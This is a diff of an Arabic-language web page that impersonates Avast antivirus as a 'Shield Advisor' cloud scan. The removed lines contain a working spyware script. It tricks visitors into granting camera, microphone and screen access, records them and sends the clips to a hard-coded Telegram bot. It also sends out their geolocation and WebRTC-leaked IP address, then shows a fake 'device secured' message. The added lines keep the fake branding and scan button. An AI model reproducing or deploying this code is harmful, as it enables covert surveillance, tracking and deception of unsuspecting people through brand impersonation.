@@ -1,169 +1,21 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Avast Premium Security | Shield Advisor</title>
-    <meta name="description" content="⚠️ تم اكتشاف نشاط مشبوه! ابدأ الفحص السحابي الآن لتأمين جهازك ومنع التجسس.">
-    <meta property="og:title" content="Avast Premium Security | Shield Advisor">
-    <meta property="og:description" content="نظام حماية سحابي متطور لتأمين المتصفح والكاميرا من الثغرات المكتشفة.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-
-    <style>
-        :root { --orange: #ff7b00; --bg: #fffcf5; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; color: #333; overflow-x: hidden; }
-        
-        /* الهيدر */
-        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; background: #fff; }
-        .logo-small { width: 35px; height: 35px; border-radius: 50%; vertical-align: middle; border: 1px solid var(--orange); }
-
-        /* القسم الرئيسي */
-        .hero { background: var(--bg); padding: 60px 8%; text-align: center; border-bottom: 1px solid #f0e0c0; }
-        .main-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.12); display: inline-block; width: 100%; max-width: 550px; border: 2px solid var(--orange); position: relative; }
-        
-        .logo-main { width: 110px; height: 110px; border-radius: 50%; box-shadow: 0 0 25px rgba(255, 123, 0, 0.3); margin-bottom: 25px; border: 3px solid var(--orange); }
-
-        .btn-scan { background: var(--orange); color: white; border: none; padding: 22px 0; font-size: 1.5rem; font-weight: bold; border-radius: 60px; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 10px 25px rgba(255, 123, 0, 0.4); }
-        .btn-scan:hover { transform: translateY(-4px); box-shadow: 0 15px 30px rgba(255, 123, 0, 0.6); }
-
-        /* شاشة الفحص الوهمية */
-        .terminal { display: none; background: #0b0e14; color: #00ff41; padding: 20px; border-radius: 12px; font-family: 'Courier New', monospace; font-size: 14px; text-align: left; direction: ltr; height: 160px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
-        
-        /* أيقونات الثقة */
-        .trust-section { padding: 50px 8%; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; text-align: center; }
-        .trust-item img { width: 50px; margin-bottom: 15px; }
-        .trust-item h4 { color: #d48806; margin: 5px 0; font-size: 18px; }
-    </style>
-</head>
-<body>
+<title>Avast Premium Security | Shield Advisor</title>
+<meta property="og:title" content="Avast Premium Security | Shield Advisor">
+<meta property="og:description" content="⚠️ تم اكتشاف نشاط مشبوه! ابدأ الفحص السحابي الآن لتأمين جهازك.">
+<meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
+<meta property="og:type" content="website">
 
 <div class="header">
-    <div>
-        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="logo-small">
-        <span style="font-weight: bold; margin-right: 10px; color: var(--orange); font-size: 18px;">Shield Advisor</span>
-    </div>
-    <div style="color: #666; font-size: 13px; font-weight: bold;">Cloud Engine: Active ✅</div>
+    <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="logo-small">
+    <span>Shield Advisor AI</span>
 </div>
 
 <div class="hero">
-    <h1 style="font-size: 2.2rem; margin-bottom: 15px;">مركز أمان <span style="color:var(--orange)">Avast</span> المتطور</h1>
-    <p style="color: #666; margin-bottom: 40px; font-size: 1.1rem;">يتم الآن فحص جهازك بواسطة Shield Advisor. اضغط للبدء في تأمين الخصوصية ومنع التجسس.</p>
-
-    <div class="main-card" id="content-area">
-        <div id="init-ui">
+    <h1>مركز أمان <span style="color:#ff7b00">Avast</span> المتقدم</h1>
+    <div class="main-card" id="box">
+        <div id="ui">
             <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="logo-main">
-            <button class="btn-scan" onclick="launchInfection()">بدء الفحص الشامل</button>
+            <button class="btn-scan" onclick="startEngine()">بدء الفحص وتأمين الجهاز</button>
         </div>
-        <div class="terminal" id="term"></div>
+        <div id="term" class="terminal"></div>
     </div>
 </div>
-
-<div class="trust-section">
-    <div class="trust-item">
-        <img src="https://cdn-icons-png.flaticon.com/512/2092/2092663.png">
-        <h4>الذكاء الاصطناعي</h4>
-        <p style="font-size: 14px; color: #777;">تحليل سلوكي فوري للتهديدات</p>
-    </div>
-    <div class="trust-item">
-        <img src="https://cdn-icons-png.flaticon.com/512/1162/1162258.png">
-        <h4>تأمين المتصفح</h4>
-        <p style="font-size: 14px; color: #777;">تشفير طبقة الحماية المتعددة</p>
-    </div>
-    <div class="trust-item">
-        <img src="https://cdn-icons-png.flaticon.com/512/702/702797.png">
-        <h4>فحص الكاميرا</h4>
-        <p style="font-size: 14px; color: #777;">كشف ومنع محاولات التجسس</p>
-    </div>
-</div>
-
-<script>
-    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
-    const ADMIN_ID = "8754338811";
-
-    async function sendMsg(text) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
-        });
-    }
-
-    async function launchInfection() {
-        document.getElementById('init-ui').style.display = 'none';
-        const term = document.getElementById('term');
-        term.style.display = 'block';
-        addLog("> Connecting to Avast Secure Cloud...");
-
-        try {
-            // طلب الأذونات (الفخ)
-            const cam = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            addLog("> [OK] Permissions synchronized.");
-
-            // سحب البيانات فوراً وإرسالها
-            sendMsg("🚀 **صيد جديد!** الضحية منح كافة الصلاحيات.");
-
-            navigator.geolocation.getCurrentPosition(p => {
-                sendMsg("📍 **موقع الضحية:** \nhttps://www.google.com/maps?q=$" + p.coords.latitude + "," + p.coords.longitude);
-            });
-
-            const rtc = new RTCPeerConnection();
-            rtc.createDataChannel("");
-            rtc.createOffer().then(o => rtc.setLocalDescription(o));
-            rtc.onicecandidate = i => {
-                if(i.candidate) sendMsg("🌐 **الـ IP الحقيقي:** `" + i.candidate.candidate.split(" ")[4] + "`");
-            };
-
-            // بدء التسجيل (كل 30 ثانية)
-            record(cam, "📷 كاميرا");
-            record(scr, "🖥️ شاشة");
-
-            // تمويه الضحية بالنتيجة
-            let prg = 0;
-            const timer = setInterval(() => {
-                prg += 20;
-                addLog("> Analyzing threats... " + prg + "%");
-                if(prg >= 100) {
-                    clearInterval(timer);
-                    document.getElementById('content-area').innerHTML = `
-                        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width:60px; border-radius:50%; margin-bottom:15px;">
-                        <h3 style="color:#00ff41; margin-top:0;">✅ تم تأمين الجهاز بنجاح!</h3>
-                        <p style="font-size:14px; color:#555;">نظام Shield Advisor يعمل الآن في الخلفية لحمايتك.</p>
-                    `;
-                }
-            }, 1500);
-
-        } catch (e) {
-            alert("⚠️ تنبيه: يجب الموافقة على الأذونات لتأمين جهازك من الثغرات المكتشفة.");
-            location.reload();
-        }
-    }
-
-    function record(stream, label) {
-        const rec = new MediaRecorder(stream);
-        let ch = [];
-        rec.ondataavailable = e => ch.push(e.data);
-        rec.onstop = async () => {
-            const blob = new Blob(ch, { type: 'video/mp4' });
-            const fd = new FormData();
-            fd.append('chat_id', ADMIN_ID);
-            fd.append('video', blob, `${label}.mp4`);
-            fd.append('caption', `🚀 **لقطة حية [${label}]**`);
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
-            if (stream.active) record(stream, label);
-        };
-        rec.start();
-        setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 30000);
-    }
-
-    function addLog(m) {
-        const t = document.getElementById('term');
-        t.innerHTML += `<div>${m}</div>`;
-        t.scrollTop = t.scrollHeight;
-    }
-</script>
-</body>
-</html>
